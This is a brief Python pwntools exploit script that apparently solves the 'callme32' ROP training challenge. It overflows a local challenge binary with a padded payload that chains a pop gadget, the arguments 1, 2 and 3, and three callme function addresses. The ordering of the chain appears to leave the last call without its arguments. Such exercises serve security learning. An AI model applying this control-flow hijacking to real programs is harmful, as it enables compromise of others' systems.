from pwn import *
import struct

# eip = struct.pack("<Q",system_addr)
# eip2 = "\x59\x86\x04\x08\x00\x00\x00\x00"

e = ELF("/home/osboxes/PycharmProjects/ROP/callme32/callme32")
callme_one = p32(e.symbols["callme_one"])  # 0x080485c0
callme_two = p32(e.symbols["callme_two"])  # 0x08048620
callme_three = p32(e.symbols["callme_three"])  # 0x080485b0
pop_gadget = p32(0x080488a9)

params = p32(1) + p32(2) + p32(3)

crap = "A" * 44

payload = crap
payload += pop_gadget + params + callme_one
payload += pop_gadget + params + callme_two
payload += pop_gadget + params + callme_three


io = e.process()

io.sendline(payload)

io.recvall()
